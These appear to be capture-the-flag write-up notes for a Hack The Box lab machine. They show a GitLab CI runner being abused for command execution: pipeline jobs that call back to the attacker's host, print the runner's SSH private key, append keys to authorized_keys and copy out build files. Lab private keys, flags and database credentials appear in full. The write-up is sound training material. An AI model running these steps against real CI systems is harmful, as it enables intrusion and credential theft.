As usual I will start by checking all the open services over the TCP protocoll via Rustscan and NMAP:

```bash
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:5c:a1:74:3a:13:b7:1e:10:1f:9b:b3:99:19:d7:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMNvF7Jf2lWFZSmRf5+xblZUcuxitJelSWrhIAnCewL8XwV4uQnMm4W0gvvjTOMccSqDPZrd6E9AcfQqnC9F9o=
|   256 c1:04:54:24:63:4e:8f:20:45:56:c3:67:e2:63:28:6e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILk5s0dksKTvOZNqHLjGYQGoMKG557DlKZPfv1jcZGoa
25/tcp    open  smtp     syn-ack ttl 64 Postfix smtpd
|_smtp-commands: gitlab01, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp    open  http     syn-ack ttl 64 nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://gitlab.wanderer.htb:443/
443/tcp   open  ssl/http syn-ack ttl 64 nginx
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 86 disallowed entries (40 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /api/v* /help /s/ /-/profile 
| /-/profile/ /-/user_settings/ /-/ide/ /-/experiment /*/new /*/edit 
| /*/raw /*/realtime_changes /groups/*/-/analytics 
| /groups/*/-/analytics/ /groups/*/-/insights/ /groups/*/-/issues_analytics 
| /groups/*/-/contribution_analytics /groups/*/-/group_members /groups/*/-/saml/ 
| /groups/*/-/saml_group_links /groups/*/-/settings/ /groups/*/-/billings 
| /groups/*/-/hooks /groups/*/-/projects /*/*.git$ /*/archive/ 
| /*/repository/archive* /*/activity /*/-/project_members /*/-/blame/ 
|_/*/-/branches /*/-/commits/
|_http-favicon: Unknown favicon MD5: 66F9A1C3F2CFD0DF1B570990E86D3095
| ssl-cert: Subject: commonName=gitlab.wanderer.htb/organizationName=IT/stateOrProvinceName=Missouri/countryName=US/localityName=Saint Louis
| Subject Alternative Name: DNS:gitlab.wanderer.htb
| Issuer: commonName=gitlab.wanderer.htb/organizationName=IT/stateOrProvinceName=Missouri/countryName=US/localityName=Saint Louis
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-08T22:02:15
| Not valid after:  2035-03-06T22:02:15
| MD5:     6cc9 8110 42d6 b617 debe 2459 1554 b32e
| SHA-1:   8989 7606 bdf9 8d73 9fd3 f2c2 9e60 d04e 7bc4 48df
| SHA-256: d0bd efbd 20e9 b152 a38c 3134 9cf9 0180 3c60 1b77 24bd 7288 6691 4e59 8f49 3e7b
| -----BEGIN CERTIFICATE-----
| MIIDwzCCAqugAwIBAgIUNayYHDksh0bclsTWxrcFQrOPG9EwDQYJKoZIhvcNAQEL
| BQAwYTELMAkGA1UEBhMCVVMxETAPBgNVBAgMCE1pc3NvdXJpMRQwEgYDVQQHDAtT
| YWludCBMb3VpczELMAkGA1UECgwCSVQxHDAaBgNVBAMME2dpdGxhYi53YW5kZXJl
| ci5odGIwHhcNMjUwMzA4MjIwMjE1WhcNMzUwMzA2MjIwMjE1WjBhMQswCQYDVQQG
| EwJVUzERMA8GA1UECAwITWlzc291cmkxFDASBgNVBAcMC1NhaW50IExvdWlzMQsw
| CQYDVQQKDAJJVDEcMBoGA1UEAwwTZ2l0bGFiLndhbmRlcmVyLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAItU6aWzIUFO7RB905R839dhBRArY5q9
| Dac2cX9rs/o5UgARXRrb+zzRSNO60T2sO3LJzJnYCNFqkPlfL+He7Dz+96AFTR66
| rJO+zhWd2G8w2wFH83t1E+X/97l5+EuaNi2Sl0kHjHqup5jO4sh2iDmwnDxMdLop
| IJ5z/qbaAsn02/7C/fe0WQS5GdoG+xdUtfJwA2kYsCGlNkac1ZH0cFEgoek2tK3w
| /qzLzB+67dzPFIwBeBwXPRhqIvU/+rk28k3Gp8jiFRYNIn7uiP6xxLMm2Rwj5+9O
| Ore05waaVK8b6AbhPZPuag9/m6HBMKxLTk1fKzZ+vhzIaNpDjHO1dRcCAwEAAaNz
| MHEwHQYDVR0OBBYEFEoTU1fVI9gBneC8AmhMRPqKDt6QMB8GA1UdIwQYMBaAFEoT
| U1fVI9gBneC8AmhMRPqKDt6QMA8GA1UdEwEB/wQFMAMBAf8wHgYDVR0RBBcwFYIT
| Z2l0bGFiLndhbmRlcmVyLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAV+PSiMHuCIVs
| iPqPuXEOS6HxyvkPBUNKeQAgJMPFZXKF1hgxceJYC5X116JkN+J3y01XG/qLxnU1
| hXp+CEY9W3FIohWM7np85TvJ3nLgvo12+oiunJJB4vbMgqI763JsoBC5nUqpy2mR
| ICQ4wkXyYhOX+JyKYjgvqpE+rQJCwvparO2SKsTgD64//JncpvSoUZtPMfBWhLR9
| WKK8YAkXax29i/BKKTZbjdBTKMwHeIT1Ep/mTyGVi761NHMLws8DuV9EjNJSb5tP
| oPNxKmkH94nw9mjbZEL95IEHpHEdDoUUO/R2v8SOFTWKyMPr7imwT/O4kBpbs56q
| 71r00o6TBA==
|_-----END CERTIFICATE-----
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was https://gitlab.wanderer.htb/users/sign_in
8060/tcp  open  http     syn-ack ttl 64 nginx 1.27.4
|_http-title: 404 Not Found
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.27.4
9094/tcp  open  unknown  syn-ack ttl 64
38977/tcp open  http     syn-ack ttl 64 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: 3Com Baseline Switch 2924-SFP or Cisco ESW-520 switch or Allied Telesis AT-8000 series switch (86%), Allied Telesis AT-8000S; Dell PowerConnect 2824, 3448, 5316M, or 5324; Linksys SFE2000P, SRW2024, SRW2048, or SRW224G4; or TP-LINK TL-SL3428 switch (86%), Aruba, Cisco, or Netgear switch (Linux 3.10 or 4.4) (86%), Linksys SRW2008MP switch (86%), Cisco SG 300-10, Dell PowerConnect 2748, Linksys SLM2024, SLM2048, or SLM224P, or Netgear FS728TP or GS724TP switch (86%), Linksys SRW2000-series or Allied Telesyn AT-8000S switch (86%), IBM z/OS 1.12 (85%), Apple iOS 4.3.3 (85%), Cisco SRW2008-K9 switch (85%), OpenBSD 5.5 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=4/13%OT=22%CT=%CU=%PV=Y%G=N%TM=69DCC33F%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=107%TI=RD%CI=RD%II=RI%TS=A)
SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=RD%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

```

# GITLab

Now I am aware (again from FTS01) that Katja had a login and again I can see the that she could login indeed on the page:

![c69bc4fe52052a9f1a246fe5adea1b20.png](../../../_resources/c69bc4fe52052a9f1a246fe5adea1b20.png)

And I can also see that there is a runner? This means a RCE:

![810d1866c5c6888f55e20c2239d9318d.png](../../../_resources/810d1866c5c6888f55e20c2239d9318d.png)

![94d44147d70a0134a365327e5424342b.png](../../../_resources/94d44147d70a0134a365327e5424342b.png)

This means I should be able to obtain a RCE right? I am injecting a bash command directly in the job:

![db649b6a6bece0434d8412b0c7771537.png](../../../_resources/db649b6a6bece0434d8412b0c7771537.png)

And I can see the jpb failed:

![b2fe54e1c1897b7939cabab9f4b9ee2b.png](../../../_resources/b2fe54e1c1897b7939cabab9f4b9ee2b.png)

now it might means this machine cannot reach me back or I need to change the payload:

```bash
running with gitlab-runner 16.2.1 (674e0e29)
  on Gitlab Runner t1_SWZ2D, system ID: s_0a0825a4c13c
Preparing the "shell" executor 00:00
Using Shell (bash) executor...
Preparing environment 00:00
Getting source from Git repository 02:11
Fetching changes with git depth set to 20...
Reinitialized existing Git repository in /home/gitlab-runner/builds/t1_SWZ2D/0/katja/fts-frontend/.git/
Checking out 22cc1b45 as detached HEAD (ref is master)...
Skipping Git submodules setup
Executing "step_script" stage of the job script
$ curl http://172.16.0.6:8080/figa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:51 --:--:--     0
```

As you see something it is doing but I do not see any result so far.

![d213b58bee5bb816c6447b22151ed601.png](../../../_resources/d213b58bee5bb816c6447b22151ed601.png)

And i can appure that indeed this is the runner inside this machine:

```bash
Running with gitlab-runner 16.2.1 (674e0e29)
  on Gitlab Runner t1_SWZ2D, system ID: s_0a0825a4c13c
Preparing the "shell" executor 00:00
Using Shell (bash) executor...
Preparing environment 00:00
Running on gitlab01...
Getting source from Git repository 02:10
Fetching changes with git depth set to 20...
Reinitialized existing Git repository in /home/gitlab-runner/builds/t1_SWZ2D/0/katja/fts-frontend/.git/
Checking out fa76067a as detached HEAD (ref is master)...
Skipping Git submodules setup
Executing "step_script" stage of the job script 00:24
$ cat /etc/hostname
gitlab01
$ whoami
gitlab-runner
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:d4:06 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    inet 172.16.0.100/24 brd 172.16.0.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe94:d406/64 scope link 
       valid_lft forever preferred_lft forever
$ ln -s ~/node_modules/ .
$ CI=false npm run build
> fts-frontend@0.1.0 build
> react-scripts build
Creating an optimized production build...
Browserslist: caniuse-lite is outdated. Please run:
  npx update-browserslist-db@latest
  Why you should do it regularly: https://github.com/browserslist/update-db#readme
Browserslist: caniuse-lite is outdated. Please run:
  npx update-browserslist-db@latest
  Why you should do it regularly: https://github.com/browserslist/update-db#readme
Compiled with warnings.
[eslint] 
src/App.js
  Line 93:26:   Expected '===' and instead saw '=='                                                                                                                                                                                                                                                                                                                                eqeqeq
  Line 93:54:   Expected '===' and instead saw '=='                                                                                                                                                                                                                                                                                                                                eqeqeq
  Line 100:11:  'response' is assigned a value but never used                                                                                                                                                                                                                                                                                                                      no-unused-vars
  Line 119:13:  'response' is assigned a value but never used                                                                                                                                                                                                                                                                                                                      no-unused-vars
  Line 138:13:  'response' is assigned a value but never used                                                                                                                                                                                                                                                                                                                      no-unused-vars
  Line 146:28:  Expected '===' and instead saw '=='                                                                                                                                                                                                                                                                                                                                eqeqeq
  Line 147:19:  'response' is assigned a value but never used                                                                                                                                                                                                                                                                                                                      no-unused-vars
  Line 172:11:  'response' is assigned a value but never used                                                                                                                                                                                                                                                                                                                      no-unused-vars
  Line 199:11:  'data' is assigned a value but never used                                                                                                                                                                                                                                                                                                                          no-unused-vars
  Line 200:11:  'response' is assigned a value but never used                                                                                                                                                                                                                                                                                                                      no-unused-vars
  Line 233:13:  'response' is assigned a value but never used                                                                                                                                                                                                                                                                                                                      no-unused-vars
  Line 238:20:  Expected '===' and instead saw '=='                                                                                                                                                                                                                                                                                                                                eqeqeq
  Line 253:19:  Expected '===' and instead saw '=='                                                                                                                                                                                                                                                                                                                                eqeqeq
  Line 266:48:  Expected '===' and instead saw '=='                                                                                                                                                                                                                                                                                                                                eqeqeq
  Line 332:23:  The href attribute requires a valid value to be accessible. Provide a valid, navigable address as the href value. If you cannot provide a valid href, but still need the element to resemble a link, use a button and change it with appropriate styles. Learn more: https://github.com/jsx-eslint/eslint-plugin-jsx-a11y/blob/HEAD/docs/rules/anchor-is-valid.md  jsx-a11y/anchor-is-valid
Search for the keywords to learn more about each warning.
To ignore, add // eslint-disable-next-line to the line before.
File sizes after gzip:
  65.75 kB  build/static/js/main.e038a1c4.js
  1.25 kB   build/static/css/main.935e9242.css
The project was built assuming it is hosted at /.
You can control this with the homepage field in your package.json.
The build folder is ready to be deployed.
You may serve it with a static server:
  npm install -g serve
  serve -s build
Find out more about deployment here:
  https://cra.link/deployment
Uploading artifacts for successful job 00:01
Uploading artifacts...
Runtime platform                                    arch=amd64 os=linux pid=17369 revision=674e0e29 version=16.2.1
build/: found 13 matching artifact files and directories 
Uploading artifacts as "archive" to coordinator... 201 Created  id=13 responseStatus=201 Created token=glcbt-64
Cleaning up project directory and file based variab
```

Next, i am trying to ping back my vpn tunnel:

![a9369adc3c22f2545bf38761c4702b97.png](../../../_resources/a9369adc3c22f2545bf38761c4702b97.png)

But the ping is not there so here I did a couple of tests and my gut feeling tells me there must be a local firewall that blocks those high ports so now i will use instead the HTTPS port on my machine to get the callback!

![5ee5b4dbe40491037e5b1f4faa3b4ba0.png](../../../_resources/5ee5b4dbe40491037e5b1f4faa3b4ba0.png)

Now I had an idea to check for SSH keys and apparently I do see something :

![4267cd918a343ae7ff8aa5393f60c6b4.png](../../../_resources/4267cd918a343ae7ff8aa5393f60c6b4.png)

Which means that sending this:

```yaml
stages:
  - build
  - deploy

build-job:
  stage: build
  script:
    - cat /home/gitlab-runner/.ssh/id_ed25519
    - ln -s ~/node_modules/ .
    - CI=false npm run build
  artifacts:
    paths:
        - build/
    expire_in: 1 hour

deploy-job:
  stage: deploy
  dependencies:
    - build-job
  script:
    - scp -r build/* deploy@172.16.0.6:/dev/shm/    
```

And now I have a privatekey:

```bash
nning with gitlab-runner 16.2.1 (674e0e29)
  on Gitlab Runner t1_SWZ2D, system ID: s_0a0825a4c13c
Preparing the "shell" executor 00:00
Using Shell (bash) executor...
Preparing environment 00:00
Running on gitlab01...
Getting source from Git repository 02:10
Fetching changes with git depth set to 20...
Reinitialized existing Git repository in /home/gitlab-runner/builds/t1_SWZ2D/0/katja/fts-frontend/.git/
Checking out 0d0a9a0a as detached HEAD (ref is master)...
Skipping Git submodules setup
Executing "step_script" stage of the job script 00:18
$ cat /home/gitlab-runner/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDOXFCbRNujWva59jfN8VDkuNxR7lntpSRnk4hNWaajIQAAAJBrxln2a8ZZ
9gAAAAtzc2gtZWQyNTUxOQAAACDOXFCbRNujWva59jfN8VDkuNxR7lntpSRnk4hNWaajIQ
AAAECoQ2fMvLv9p0DdxuD0xrJDQ4JL8jL1D36NRWdlqBkJus5cUJtE26Na9rn2N83xUOS4
3FHuWe2lJGeTiE1ZpqMhAAAADWlwcHNlY0BwYXJyb3Q=
-----END OPENSSH PRIVATE KEY-----
```

But that key is used for the deploy username on FTS for this reason I must inject my ssh key instead in the "*authorized_keys*" instead:

```bash
stages:
  - build
  - deploy

build-job:
  stage: build
  script:
    - echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCYaIt0y/UDvyiSGfa6u3YKCA+JA1wuDY16Z4ZH+fHOX1V/Kx7UcDJrNrI6n8Rtb75JFegPqqeYwroafLSZbspLajRjNl2oQl9E4rtP6Aw3GH0HVsZXLdwK+2TMty5/BYf+zOfZ6YHW/F41FP025TaK4Er6kHHqq6G1kkH3J/iIJSt2OO3Hww3nOxA29kObAF3iKXy73DOBIsOpp2xuhnIPSIei/eJUWHTLwupVuX3Z7rM5j2CNEkWfbdp/a91/cG5VzsCEVSODXdR23a5ZlMftny+bJVTFWECIQM8r9ruyRdth90IVfy8ICztP5qnITF9GA6OAgasdcAVciDeyZ7N08IAwUyu/o36fnlJbTXWWmsN6nPZ4eH9mSBSizZ8G0g9h9CXPjg/uCIXgko/E5/AoHa1eWUXG2J1R6vVL5OujFJkXbyz7Iy/LU+fNIrObPij/91BecbGZLosB0sxZ254O/fWoL247ON1GOanoynTHAh8NT2YU+0EXB6y7jEhA6ixJJLJaYKw6lO/CBT+woFVP7PJUSK+F5rKPX0YCIoBCpk8caOJ7VrHJUb2lX74AvjaFgocYw20dskvJNJl7nXzNMXNoIUThrsTfMJ5xD/uVxne5y+LexZ0AyXnb+wqMb+MqB+JQY0kYQWM9ftfqN2Fcpl+s29ihZ699YL46zrpeLw== user@kali-almi' >> /home/gitlab-runner/.ssh/authorized_keys
    - ln -s ~/node_modules/ .
    - CI=false npm run build
  artifacts:
    paths:
        - build/
    expire_in: 1 hour

deploy-job:
  stage: deploy
  dependencies:
    - build-job
  script:
    - scp -r build/* deploy@172.16.0.6:/dev/shm/    
```

But that is not working so instead I will create a local private key for the SSH:

```bash
stages:
  - build
  - deploy

build-job:
  stage: build
  script:
    - ls -al /home/gitlab-runner/.ssh/
    - cat /home/gitlab-runner/.ssh/id_rsa
    - cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
    - chmod 600 ~/.ssh/authorized_keys
    - ls -al ~/.ssh/authorized_keys
    - ln -s ~/node_modules/ .
    - CI=false npm run build
  artifacts:
    paths:
        - build/
    expire_in: 1 hour

deploy-job:
  stage: deploy
  dependencies:
    - build-job
  script:
    - scp -r build/* deploy@172.16.0.6:/dev/shm/    
```

And with the ssh key I can now login and grab another flag:

```bash
─$ ssh -i gitlab_key gitlab-runner@172.16.0.100
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Apr 13 12:04:46 2026 from 172.16.0.3
gitlab-runner@gitlab01:~$ ls -al
total 884
drwxr-x---   8 gitlab-runner gitlab-runner   4096 Apr 13 12:17 .
drwxr-xr-x   3 root          root            4096 Mar  8  2025 ..
lrwxrwxrwx   1 root          root               9 Mar 19  2025 .bash_history -> /dev/null
drwx------   2 gitlab-runner gitlab-runner   4096 Apr 13 02:18 .cache
drwx------   3 gitlab-runner gitlab-runner   4096 Apr 13 11:43 .gnupg
lrwxrwxrwx   1 root          root               9 Mar 19  2025 .mysql_history -> /dev/null
drwxrwxr-x   3 gitlab-runner gitlab-runner   4096 Mar  8  2025 .npm
drwx------   2 gitlab-runner gitlab-runner   4096 Apr 13 13:32 .ssh
-rw-------   1 gitlab-runner gitlab-runner   1829 Apr 13 12:17 .viminfo
drwxrwxr-x   3 gitlab-runner gitlab-runner   4096 Mar  8  2025 builds
-r--r--r--   1 root          root              37 Mar  8  2025 flag.txt
-rw-rw-r--   1 gitlab-runner gitlab-runner 828098 Apr 13 11:41 linpeas.sh
drwxr-xr-x 845 gitlab-runner          1004  36864 Feb 17  2025 node_modules
gitlab-runner@gitlab01:~$ cat flag.txt 
HTB{59f48622240a6f2cfe557fb39bdf9138}gitlab-runner@gitlab01:~$ 


```

but under builds I can see that the user gizmo have been working in the portal as well :

```bash
itlab-runner@gitlab01:~/builds/t1_SWZ2D/0/gizmo$ ls
mobile-api  mobile-api.tmp
gitlab-runner@gitlab01:~/builds/t1_SWZ2D/0/gizmo$ 
```

Now i will export the whole build folder for further analysis on my machine:

```bash
─$ scp -i gitlab_key gitlab-runner@172.16.0.100:/home/gitlab-runner/builds/t1_SWZ2D/0/gizmo/mobile-api.tar.gz . 
mobile-api.tar.gz   
```

From here I can see this is the initial push, which means if there are any creds then they should still be here:

![b4dc470231078f39b3a0edb28ac9bb38.png](../../../_resources/b4dc470231078f39b3a0edb28ac9bb38.png)

From the config file I can see the MongoDB credentials used by the API, which means most likely it is a NOSQL we are talking about:

```bash
from pydantic import BaseSettings


class CommonSettings(BaseSettings):
    APP_NAME: str = "FARM Intro"
    DEBUG_MODE: bool = False


class ServerSettings(BaseSettings):
    HOST: str = "0.0.0.0"
    PORT: int = 8000


class DatabaseSettings(BaseSettings):
    DB_URL: str = "mongodb://mongo:SuperS3cretPass@127.0.0.1/mobile?retryWrites=true&w=majority"
    DB_NAME: str = "mobile"



class Settings(CommonSettings, ServerSettings, DatabaseSettings):
    pass


settings = Settings()

```

# Back on Track

With the credenials obtained by process injecting that root I am now able to login as root on this machine.

```bash
root@gitlab01:~# ll
total 52
drwx------  6 root root  4096 May 19  2025 ./
drwxr-xr-x 18 root root  4096 May 19  2025 ../
drwx------  3 root root  4096 Mar  8  2025 .ansible/
drwxr-xr-x  2 root root  4096 Mar  8  2025 .ansible_async/
lrwxrwxrwx  1 root root     9 Mar 19  2025 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Oct 15  2021 .bashrc
drwx------  3 root root  4096 Jul 10  2023 .cache/
-rw-------  1 root root    20 Apr 27  2025 .lesshst
lrwxrwxrwx  1 root root     9 Mar 19  2025 .mysql_history -> /dev/null
-rw-r--r--  1 root root   161 Jul  9  2019 .profile
drwx------  2 root root  4096 Mar  8  2025 .ssh/
-rw-------  1 root root 11333 May 19  2025 .viminfo
-rw-r--r--  1 root root    38 Mar 28  2025 flag.txt
root@gitlab01:~# cat flag.txt 
HTB{0e4993fb9a9445b41fb37255f3082ab2}
root@gitlab01:~# 


```

I tried to check but those custom Ansible folder were totally empty.

&nbsp;